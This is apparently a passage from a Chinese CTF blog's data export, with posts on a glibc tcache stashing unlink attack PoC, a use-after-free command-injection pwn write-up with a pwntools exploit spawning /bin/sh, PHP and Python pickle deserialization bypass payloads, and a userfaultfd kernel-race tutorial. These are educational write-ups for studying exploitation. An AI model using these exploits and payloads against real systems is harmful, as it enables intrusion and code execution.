(uint64_t)(&amp;victim);是需要将fake_chunk的bk指针指向任意可写地址！\n\n这个时候我们的利用危害性相对来说就比较大了，但是我们可以结合起来第一个漏洞来一起使用，也就是同时修改指定地址的值，并且在另一个地方创建fake chunk\ntcache stashing unlink attack++其实利用方式也很简单，就是我们修改fake chunk的bk指针就行，这里就不细说，把poc贴出来就行了(要恰饭了)\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;static uint64_t victim[4] = &#123;0, 0, 0, 0&#125;;static uint64_t victim2 = 0;int main(int argc, char **argv)&#123;\tsetbuf(stdout, 0);\tsetbuf(stderr, 0);\tchar *t1;\tchar *s1, *s2, *pad;\tchar *tmp;\tprintf(&quot;You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\\n&quot;);\tprintf(&quot;\\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\\n&quot;);\ttmp = malloc(0x1);\tprintf(&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\t&amp;victim, victim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;victim2&#x27;s address: %p, victim2&#x27;s value: 0x%lx\\n&quot;,\t\t&amp;victim2, victim2);\tprintf(&quot;heap address: %p\\n&quot;, tmp-0x260);\tprintf(&quot;\\n2. change victim&#x27;s data, make victim[1] = &amp;victim2-0x10\\n&quot;);\tvictim[1] = (uint64_t)(&amp;victim2)-0x10;\tprintf(&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\tvictim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;\\n3. choose a stable size and free five identical size chunks to tcache_entry list\\n&quot;);\tprintf(&quot;Here, I choose the size 0x60\\n&quot;);\tfor(int i=0; i&lt;5; i++)&#123;\t\tt1 = calloc(1, 0x50);\t\tfree(t1);\t&#125;\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\tt1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;\\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\\n&quot;);\ts1 = malloc(0x420);\tprintf(&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\\n&quot;, s1);\tpad = malloc(0x20);\tprintf(&quot;Alloc a padding chunk, avoid %p to merge to top chunk\\n&quot;, s1);\tfree(s1);\tprintf(&quot;Free chunk %p to unsortedbin\\n&quot;, s1);\tmalloc(0x3c0);\tprintf(&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\\n&quot;);\tmalloc(0x100);\tprintf(&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\\n&quot;);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s1+0x3c0);\tprintf(&quot;Repeat the above steps, and free another chunk into corresponding smallbin\\n&quot;);\tprintf(&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\\n&quot;);\ts2 = malloc(0x420);\tpad = malloc(0x80);\tfree(s2);\tmalloc(0x3c0);\tmalloc(0x100);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s2+0x3c0);\tprintf(&quot;smallbin[4] list is %p &lt;--&gt; %p\\n&quot;, s2+0x3c0, s1+0x3c0);\tprintf(&quot;\\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\\n&quot;);\tprintf(&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\\n&quot;, s2+0x3c0, (uint64_t)(&amp;victim)-0x10);\t*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\tprintf(&quot;\\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\\n&quot;);\tcalloc(1, 0x50);\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\t&amp;victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;Apply to tcache_entry[4], you can get a pointer to victim address\\n&quot;);\t\tuint64_t *r = (uint64_t*)malloc(0x50);\tr[0] = 0xaa;\tr[1] = 0xbb;\tr[2] = 0xcc;\tr[3] = 0xdd;\tprintf(&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\tvictim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;victim2&#x27;s value: 0x%lx\\n&quot;,\t\tvictim2);\treturn 0;&#125;\t\n\n\n参考链接https://github.com/StarCross-Tech/heap_exploit_2.31\n","categories":["pwn"],"tags":["tcache stashing unlink attack"]},{"title":"time_formatter","url":"/2021/10/25/time-formatter/","content":"第一次做堆题目还是有点激动。\n检查保护\n没什么好说的，就开启了canary和nx。\n分析分析流程__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  __gid_t v3; // eax  int v4; // eax  v3 = getegid();  setresgid(v3, v3, v3);  setbuf(stdout, 0LL);  puts(&quot;Welcome to Mary&#x27;s Unix Time Formatter!&quot;);  do  &#123;    while ( 2 )    &#123;      puts(&quot;1) Set a time format.&quot;);      puts(&quot;2) Set a time.&quot;);      puts(&quot;3) Set a time zone.&quot;);      puts(&quot;4) Print your time.&quot;);      puts(&quot;5) Exit.&quot;);      __printf_chk(1LL, &quot;&gt; &quot;);      fflush(stdout);      switch ( choice() )      &#123;        case 1u:          v4 = choice_1();          break;        case 2u:          v4 = choice_2();          break;        case 3u:          v4 = choice_3();          break;        case 4u:          v4 = choice_4();          break;        case 5u:          v4 = choice_5();          break;        default:          continue;      &#125;      break;    &#125;  &#125;  while ( !v4 );  return 0LL;&#125;\n\n流程很简单，就是一直选这几个选项然后执行函数，main函数没什么漏洞\nint choice()// 输入一个数字选择下面的执行内容&#123;  char s[16]; // [rsp+8h] [rbp-20h] BYREF  unsigned __int64 v2; // [rsp+18h] [rbp-10h]  v2 = __readfsqword(0x28u);  fgets(s, 16, stdin);  return atoi(s);&#125;\n\n__int64 choice_1()&#123;  void *v0; // rbx  v0 = get_format(&quot;Format: &quot;);  if ( check(v0) )  &#123;    ptr = v0;    puts(&quot;Format set.&quot;);  &#125;  else  &#123;    puts(&quot;Format contains invalid characters.&quot;);    sub_400C7E(v0);  &#125;  return 0LL;&#125;\n\n__int64 __fastcall get_format(const char *a1)&#123;  char s[1024]; // [rsp+8h] [rbp-410h] BYREF  unsigned __int64 v3; // [rsp+408h] [rbp-10h]  v3 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;%s&quot;, a1);  fflush(stdout);  fgets(s, 0x400, stdin);  s[strcspn(s, &quot;\\n&quot;)] = 0;  return vuln_func(s);&#125;\n\nchar *__fastcall vuln_func(const char *a1)// 漏洞函数&#123;  char *v1; // rax  char *v2; // rbx  v1 = strdup(a1);// strdup函数就是，使用malloc创建一个跟a1大小一样的chunk，然后把a1的值复制过去  if ( !v1 )    err(1, &quot;strdup&quot;);  v2 = v1;  if ( getenv(&quot;DEBUG&quot;) )    __fprintf_chk(stderr, 1LL, &quot;strdup(%p) = %p\\n&quot;, a1, v2);  return v2;&#125;\n\n_BOOL8 __fastcall check(char *s)&#123;  char accept[51]; // [rsp+5h] [rbp-43h] BYREF  unsigned __int64 v3; // [rsp+38h] [rbp-10h]  strcpy(accept, &quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;);// 检验输入的内容必须是这里面的内容  v3 = __readfsqword(0x28u);  return strspn(s, accept) == strlen(s);&#125;\n\n从这里看的话其实vuln_func没有问题，关键在chioce_4这个函数里面\n__int64 choice_4()&#123;  char command[2048]; // [rsp+8h] [rbp-810h] BYREF  unsigned __int64 v2; // [rsp+808h] [rbp-10h]  v2 = __readfsqword(0x28u);  if ( ptr )  &#123;    __snprintf_chk(command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;, dword_602120, ptr);// 然而这里给command赋值通过格式化字符串，还有ptr也在其中，所以只要修改ptr为&#x27;;/bin/sh;&#x27;就好了    __printf_chk(1LL, &quot;Your formatted time is: &quot;);    fflush(stdout);    if ( getenv(&quot;DEBUG&quot;) )      __fprintf_chk(stderr, 1LL, &quot;Running command: %s\\n&quot;, command);    setenv(&quot;TZ&quot;, value, 1);    system(command);// 可以看到这里执行了command  &#125;  else  &#123;    puts(&quot;You haven&#x27;t specified a format!&quot;);  &#125;  return 0LL;&#125;\n\n可以看到上面的ptr被过滤了，刚好这个直接放进去是不得行的。\n__int64 choice_5()&#123;  __int64 result; // rax  char s[16]; // [rsp+8h] [rbp-20h] BYREF  unsigned __int64 v2; // [rsp+18h] [rbp-10h]  v2 = __readfsqword(0x28u);  sub_400C7E(ptr);// 这个其实就是free，我也把代码贴出来了  sub_400C7E(value);  __printf_chk(1LL, &quot;Are you sure you want to exit (y/N)? &quot;);  fflush(stdout);  fgets(s, 16, stdin);  result = 0LL;  if ( (s[0] &amp; 0xDF) == 89 )  &#123;    puts(&quot;OK, exiting.&quot;);    result = 1LL;  &#125;  return result;&#125;\n\nvoid __fastcall sub_400C7E(void *ptr)&#123;  if ( getenv(&quot;DEBUG&quot;) )    __fprintf_chk(stderr, 1LL, &quot;free(%p)\\n&quot;, ptr);  free(ptr);&#125;\n\n可以看到，我们在选择5的时候程序是先将ptr free掉然后再询问是否退出，看到这里的第一反应就是UAF\n__int64 choice_3()&#123;  value = get_format(&quot;Time zone: &quot;);  puts(&quot;Time zone set.&quot;);  return 0LL;&#125;\n\n利用过程在执行的时候，首先选择1然后随便写入一个符合过滤要求的字符，然后写入到chunk当中，然后直接选择5，这个时候已经是free掉了ptr但是ptr没有置为null所以还是指向到被free的chunk的位置，然后是否推出选择N不退出，然后选择3，在3当中新生成的chunk其实就是ptr所指向的chunk，而且没有过滤所以直接写入payload就好，然后选择4就可以getshell\nexpfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/5781dfd4ffed4d51a72a28a8571ef063&#x27;)# r = remote(&#x27;111.200.241.244&#x27;, 57916)r = process(&#x27;./questions/5781dfd4ffed4d51a72a28a8571ef063&#x27;)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Format: &#x27;)r.sendline(b&#x27;A&#x27;)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;5&#x27;)r.recvuntil(b&#x27;Are you sure you want to exit (y/N)? &#x27;)r.sendline(b&#x27;N&#x27;)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;3&#x27;)payload = b&quot;&#x27;;/bin/sh;&#x27;&quot;r.recvuntil(b&#x27;Time zone: &#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;4&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["use after free"]},{"title":"反序列化漏洞的一些知识点","url":"/2021/09/17/unserialize/","content":"绕过__wakeup()函数把序列化产生的字符串里面的属性值增大比如:\tO:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\t           ^\t         表示类中含有一个属性值\tO:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\t\t\t   ^\t\t\t 修改为2即可绕过wakeup函数，可以写上__destruct()函数执行相应的响应体\n\n\n在绕过preg_match(“/[oc]:\\d/“)和__wakeup()在下面情况\n\n在序列化的过程中不同属性的对象序列化的结果不一致( &quot;=&gt;&quot; )Private属性 ： 数据类型:属性名长度:&quot;\\00类名\\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;Protected属性 ： 数据类型:属性名长度:&quot;\\00*\\00属性名&quot;;数据类型:属性值长度:&quot;属性值;;Public属性 ： 数据类型:属性名长度:&quot;属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;\n\n在反序列化的时候，会遵循某种规则首先判断字符串的一个元素，为大写的&quot;O&quot;，跳转到验证第二字符&quot;：&quot;冒号在验证冒号是，若是为数字就会正常序列化，若是为&quot;+&quot;就会跳转到验证数字然后继续序列化所以就可以利用这种方式来绕过类似于preg_match(&quot;/[oc]:\\d/&quot;)的函数\n\n\n\n但是会产生新的问题，在以往的过程中，习惯于直接echo出序列化的结果，再进行base64加密，但是在class内部的属性为private或者protected定义的时候就会产生破坏原本的结构，破坏\\00\n\n\n\n&lt;?phpclass Demo &#123;     private $file = &#x27;fl4g.php&#x27;;    public function __construct($file) &#123;         $this-&gt;file = $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file != &#x27;index.php&#x27;) &#123;             $this-&gt;file = &#x27;index.php&#x27;;             echo &quot;yes&quot;;        &#125;     &#125; &#125;$wow=new Demo(&quot;fl4g.php&quot;);echo serialize($wow);echo &quot;&lt;br&gt;&quot;;echo base64_encode(preg_replace(&quot;/1:&#123;s/&quot;,&quot;2:&#123;s&quot;,preg_replace(&quot;/:4/&quot;,&quot;:+4&quot;,serialize($wow))));\n\n输出的结果为：\nO:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==base64解码下面的内容后：O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;得到了下面的结果，其实也因为\\00被破坏才导致看起来是一样的protected属性被序列化的时候属性值会变成 %00*%00属性名private属性被序列化的时候属性值会变成 %00类名%00属性名PS:php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可\n\n\npython反序列化(pickle)\n\n很神奇的一点就是python会把反序列化的东西放在生成在byte中(尤为注意py2,3的区别)\n题目:buuctf ikun\nimport pickleimport urllibclass AdminHandler(BaseHandler):    @tornado.web.authenticated    def get(self, *args, **kwargs):        if self.current_user == &quot;admin&quot;:            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)        else:            return self.render(&#x27;no_ass.html&#x27;)    @tornado.web.authenticated    def post(self, *args, **kwargs):        try:            become = self.get_argument(&#x27;become&#x27;)            # pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。            #             #            #             # pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，            #             #            #             # pickle序列化后的数据，可读性差，人一般无法识别。            p = pickle.loads(urllib.unquote(become))            # urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式            # pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回            return self.render(&#x27;form.html&#x27;, res=p, member=1)        except:            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)\n\nimport pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))# __reduce__:当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。# __reduce__ 被定义之后，当对象被Pickle时就会被调用。# 它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。# 这个元组包含2到5个元素，其中包括：#       一个可调用的对象，用于重建对象时调用；【我们这里的eval】#       一个参数元素，供那个可调用对象使用； 【我们这里的open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()】#       被传递给 __setstate__ 的状态（可选）；#       一个产生被pickle的列表元素的迭代器（可选）；#       一个产生被pickle的字典元素的迭代器（可选）a = pickle.dumps(payload())# pickle.dumps(obj)：以字节对象形式返回封装的对象，不需要写入文件中a = urllib.quote(a)print a\n\n\nPHP对于不存在的类反序列化问题\n\n&lt;?phpecho serialize(unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:1:&quot;b&quot;;s:3:&quot;wow&quot;;&#125;&#x27;));var_dump((unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:1:&quot;b&quot;;s:3:&quot;wow&quot;;&#125;&#x27;));\n\nO:1:&quot;A&quot;:1:&#123;s:1:&quot;b&quot;;s:3:&quot;wow&quot;;&#125;object(__PHP_Incomplete_Class)#1 (2) &#123;  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;  string(1) &quot;A&quot;  [&quot;b&quot;]=&gt;  string(3) &quot;wow&quot;&#125;可以发现产生的对象是__PHP_Incomplete_Class对象，反序列化的名字保存在__PHP_Incomplete_Class里面属性就直接放在下面\n\n现在我们自己创建一个一串反序列化的字符串\n&lt;?phpvar_dump(unserialize(&#x27;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;dzh&quot;;&#125;i:1;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;dzhsb&quot;;&#125;&#125;&#x27;));var_dump(unserialize(serialize(unserialize(&#x27;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;dzh&quot;;&#125;i:1;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;dzhsb&quot;;&#125;&#125;&#x27;))));\n\narray(2) &#123;  [0]=&gt;  object(__PHP_Incomplete_Class)#1 (2) &#123;    [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;    string(1) &quot;A&quot;    [&quot;name&quot;]=&gt;    string(3) &quot;dzh&quot;  &#125;  [1]=&gt;  object(__PHP_Incomplete_Class)#2 (1) &#123;    [&quot;name&quot;]=&gt;    string(5) &quot;dzhsb&quot;  &#125;&#125;array(2) &#123;  [0]=&gt;  object(__PHP_Incomplete_Class)#1 (2) &#123;    [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;    string(1) &quot;A&quot;    [&quot;name&quot;]=&gt;    string(3) &quot;dzh&quot;  &#125;  [1]=&gt;  object(__PHP_Incomplete_Class)#2 (0) &#123;  &#125;&#125;\n\n可以发现在经过一次反序列化然后序列化再一次反序列化之后，下面我们所创建的对象的属性已经不见了，那是因为，找不到__PHP_Incomplete_Class_Name这个属性，所以php直接将这个摧毁了。这种绕过方式在一些题目中可以找到。\n// index.php&lt;?phperror_reporting(0);include &quot;function.php&quot;;$res = unserialize($_POST[&#x27;d1no&#x27;]);if (preg_match(&#x27;/H3rmesk1t/i&#x27;, serialize($res))) &#123;    echo &quot;What??? try again!!!&quot; . PHP_EOL; // 这里其实存在问题的，应该直接抛出错误，要是直接echo的话会让上面的反序列化照常可以进行&#125;// function.php&lt;?phpfunction __autoload($coolClass)&#123;    require_once &quot;./$coolClass.php&quot;;&#125;// H3rmesk1t.php&lt;?phpclass Dino&#123;    public $var1;    public $var2;    function __construct($var1, $var2)    &#123;        $var1 = $var1;        $var2 = $var2;    &#125;    function __destruct()    &#123;        echo md5($this-&gt;var1) . &quot;\\n&quot;;        echo md5($this-&gt;var2) . &quot;\\n&quot;;        if (($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2))) &#123;            eval($this-&gt;var1);        &#125;    &#125;&#125;\n\n解题思路：\n// 首先必要的是绕过&quot;if (($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)))&quot;这条if语句;// 因为md5和sha1同时绕过的话，即便是碰撞也无能为力。所以寻找可以利用的原声类()&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    if (in_array(&#x27;toString&#x27;, $methods)) &#123;        echo $class;    &#125;&#125;// 通过这个方法找到已申明的类当中是否存在__toString方法// 然后这里选用的是Exception这个类，他的__toString返回值是输入的msg，所在的文件，所处于的行数。在md5函数还有sha1函数都会执行__toString然后return的值相同就可以绕过，然后修改后面的code值会让两个对象不相同(其实我觉得两个对象即便是不改后面的值也是相同的因为对象会新开辟内存所以不相同)。// 所以最终的exp&lt;?phpclass H3rmesk1t&#123;&#125;class Dino&#123;    public $var1;    public $var2;&#125;class wow&#123;    public $zzz;&#125;$payload = &#x27;?&gt;&lt;?php phpinfo();?&gt;&#x27;;$a = new Exception($payload);$b = new Exception($payload, 1);$x = new Dino();$x-&gt;var1 = $a;$x-&gt;var2 = $b;$y = new wow(); // __php_Incomplete_Class$y-&gt;zzz = new H3rmesk1t();$res = array($y, $x);echo urlencode(preg_replace(&#x27;/wow/&#x27;, &#x27;__php_Incomplete_Class&#x27;, serialize($res)));\n\n\nfast_destruct的怪异行为\n\n上面没有解释为什么需要这么搞。主要原因就是真正需要的函数是__destruct函数，但是反序列化的结果被赋值给了一个变量，就导致，要经过下面的if语句才能执行到destruct，但是如果没有”H3rmesk1t”那就无法通过function.php文件引入H3rmesk1t.php文件就会导致反序列化失败，但是有的话就会抛出错误中断反序列化的进度。所以就需要用到”__PHP_Incomplete_Class”这个对象来实现，根据上面的特性，这个在经过一次反序列化之后，在进行序列化的话就会抛弃内部的元素，达到了绕过的效果。还有一种方式就是fast_destruct。\n&lt;?phpclass A&#123;    public function __destruct()    &#123;        print(&quot;this is A::destruct\\n&quot;);        $this-&gt;dzhsb-&gt;c();    &#125;&#125;class B&#123;    public function __call($f, $p)    &#123;        print(&quot;this is B::__call\\n&quot;);    &#125;    public function __wakeup()    &#123;        print(&quot;this is B::__wakeup\\n&quot;);    &#125;    public function __destruct()    &#123;        print(&quot;this is B::__destruct\\n&quot;);    &#125;&#125;unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:5:&quot;dzhsb&quot;;O:1:&quot;B&quot;:0:&#123;&#125;&#125;&#x27;);==============================================================================================================================this is B::__wakeupthis is A::destructthis is B::__callthis is B::__destruct==============================================================================================================================&lt;?phpclass A&#123;    public function __destruct()    &#123;        print(&quot;this is A::destruct\\n&quot;);        $this-&gt;dzhsb-&gt;c();    &#125;&#125;class B&#123;    public function __call($f, $p)    &#123;        print(&quot;this is B::__call\\n&quot;);    &#125;    public function __wakeup()    &#123;        print(&quot;this is B::__wakeup\\n&quot;);    &#125;    public function __destruct()    &#123;        print(&quot;this is B::__destruct\\n&quot;);    &#125;&#125;unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:5:&quot;dzhsb&quot;;O:1:&quot;B&quot;:0:&#123;&#125;;&#125;&#x27;);==============================================================================================================================PHP Notice:  unserialize(): Error at offset 35 of 37 bytes in /home/tcdy/Download/www/payload.php on line 25this is A::destructthis is B::__callthis is B::__wakeupthis is B::__destruct    // 改变属性的个数也行   O:1:&quot;A&quot;:2:&#123;s:5:&quot;dzhsb&quot;;O:1:&quot;B&quot;:0:&#123;&#125;&#125;\n\n","categories":["web"],"tags":["unserialize"]},{"title":"userfaultfd利用","url":"/2022/08/16/userfaultfd/","content":"其实这应该是kernelpwn基础中的一个，但是一直没有很关心，在最近做一道题目时又提到了这一利用方式，索性就把这玩意给先写了。\n简单理解userfaultfd 并不是一种攻击的名字，它是 Linux 提供的一种让用户自己处理缺页异常的机制，初衷是为了提升开发灵活性，在 kernel pwn 中常被用于提高条件竞争的成功率。比如在如下的操作时\ncopy_from_user(kptr, user_buf, size);\n\n如果在进入函数后，实际拷贝开始前线程被中断换下 CPU，别的线程执行，修改了 kptr 指向的内存块的所有权（比如 kfree 掉了这个内存块），然后再执行拷贝时就可以实现 UAF。这种可能性当然是比较小的，但是如果 user_buf 是一个 mmap 的内存块，并且我们为它注册了 userfaultfd，那么在拷贝时出现缺页异常后此线程会先执行我们注册的处理函数，在处理函数结束前线程一直被暂停，结束后才会执行后面的操作，大大增加了竞争的成功率。\n相关知识页调度与延迟加载有的内存既不在RAM也不在交换区，例如mmap创建的内存映射页。mmap页在read/write访问之前，实际上还没有创建（还没有映射到实际的物理页），例如：mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0); 内核并未将fd内容拷贝到0x1337000，只是将地址0x1337000映射到文件fd。\n当有如下代码访问时：\nchar *a = (char *)0x1337000printf(&quot;content: %c\\n&quot;, a[0]);\n\n若发生对该页的引用，则（1）为0x1337000创建物理帧，（2）从fd读内容到0x1337000，（3）并在页表标记合适的入口，以便识别0x1337000虚地址。如果是堆空间映射，仅第2步不同，只需将对应物理帧清0。\n总之，若首次访问mmap创建的页，会耗时很长，会导致上下文切换和当前线程的睡眠。\nuserfaultfd我对于他的理解就是，userfaultfd机制是用来处理页缺陷的，并且处理的handle函数我们也是可以控制的。正常的流程一般为下面几步。\nStep 1: 创建一个描述符uffd所有的注册内存区间、配置和最终的缺页处理等就都需要用ioctl来对这个uffd操作。ioctl-userfaultfd支持UFFDIO_API、UFFDIO_REGISTER、UFFDIO_UNREGISTER、UFFDIO_COPY、UFFDIO_ZEROPAGE、UFFDIO_WAKE等选项。比如UFFDIO_REGISTER用来向userfaultfd机制注册一个监视区域，这个区域发生缺页时，需要用UFFDIO_COPY来向缺页的地址拷贝自定义数据。\n# 2 个用于注册、注销的ioctl选项：UFFDIO_REGISTER                 注册将触发user-fault的内存地址UFFDIO_UNREGISTER               注销将触发user-fault的内存地址# 3 个用于处理user-fault事件的ioctl选项：UFFDIO_COPY                     用已知数据填充user-fault页UFFDIO_ZEROPAGE                 将user-fault页填零UFFDIO_WAKE                     用于配合上面两项中 UFFDIO_COPY_MODE_DONTWAKE 和                                UFFDIO_ZEROPAGE_MODE_DONTWAKE模式实现批量填充  # 1 个用于配置uffd特殊用途的ioctl选项：UFFDIO_API                      它又包括如下feature可以配置：                                UFFD_FEATURE_EVENT_FORK         (since Linux 4.11)                                UFFD_FEATURE_EVENT_REMAP        (since Linux 4.11)                                UFFD_FEATURE_EVENT_REMOVE       (since Linux 4.11)                                UFFD_FEATURE_EVENT_UNMAP        (since Linux 4.11)                                UFFD_FEATURE_MISSING_HUGETLBFS  (since Linux 4.11)                                UFFD_FEATURE_MISSING_SHMEM      (since Linux 4.11)                                UFFD_FEATURE_SIGBUS             (since Linux 4.14)// userfaultfd系统调用创建并返回一个uffd，类似一个文件的fduffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n\nSTEP 2. 用ioctl的UFFDIO_REGISTER选项注册监视区域// 注册时要用一个struct uffdio_register结构传递注册信息:// struct uffdio_range &#123;// __u64 start;    /* Start of range */// __u64 len;      /* Length of range (bytes) */// &#125;;//// struct uffdio_register &#123;// struct uffdio_range range;// __u64 mode;     /* Desired mode of operation (input) */// __u64 ioctls;   /* Available ioctl() operations (output) */// &#125;;addr = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)// addr 和 len 分别是我匿名映射返回的地址和长度，赋值到uffdio_registeruffdio_register.range.start = (unsigned long) addr;uffdio_register.range.len = len;// mode 只支持 UFFDIO_REGISTER_MODE_MISSINGuffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;// 用ioctl的UFFDIO_REGISTER注册ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register);\n\nSTEP 3. 创建一个处理专用的线程轮询和处理”user-fault”事件要使用userfaultfd，需要创建一个处理专用的线程轮询和处理”user-fault”事件。主进程中就要调用pthread_create创建这个自定义的handler线程：\n// 主进程中调用pthread_create创建一个fault handler线程pthread_create(&amp;thr, NULL, fault_handler_thread, (void *) uffd);\n\n一个自定义的线程函数举例如下，这里处理的是一个普通的匿名页用户态缺页，我们要做的是把我们一个已有的一个page大小的buffer内容拷贝到缺页的内存地址处。用到了poll函数轮询uffd，并对轮询到的UFFD_EVENT_PAGEFAULT事件(event)用拷贝(ioctl的UFFDIO_COPY选项)进行处理。\nstatic void * fault_handler_thread(void *arg)&#123;        // 轮询uffd读到的信息需要存在一个struct uffd_msg对象中    static struct uffd_msg msg;    // ioctl的UFFDIO_COPY选项需要我们构造一个struct uffdio_copy对象    struct uffdio_copy uffdio_copy;    uffd = (long) arg;      ......    for (;;) &#123; // 此线程不断进行polling，所以是死循环        // poll需要我们构造一个struct pollfd对象        struct pollfd pollfd;        pollfd.fd = uffd;        pollfd.events = POLLIN;        poll(&amp;pollfd, 1, -1);        // 读出user-fault相关信息        read(uffd, &amp;msg, sizeof(msg));        // 对于我们所注册的一般user-fault功能，都应是UFFD_EVENT_PAGEFAULT这个事件        assert(msg.event == UFFD_EVENT_PAGEFAULT);        // 构造uffdio_copy进而调用ioctl-UFFDIO_COPY处理这个user-fault        uffdio_copy.src = (unsigned long) page;        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(page_size - 1);        uffdio_copy.len = page_size;        uffdio_copy.mode = 0;        uffdio_copy.copy = 0;        // page(我们已有的一个页大小的数据)中page_size大小的内容将被拷贝到新分配的msg.arg.pagefault.address内存页中        ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy);          ......    &#125;&#125;\n\n例题：QWB2021-notebook题目分析qemu-system-x86_64 \\    -m 256M \\    -kernel bzImage \\    -initrd rootfs.cpio \\    -append &quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot; \\    -nographic \\    -net user \\    -net nic \\    -device e1000 \\    -smp cores=2,threads=2 \\    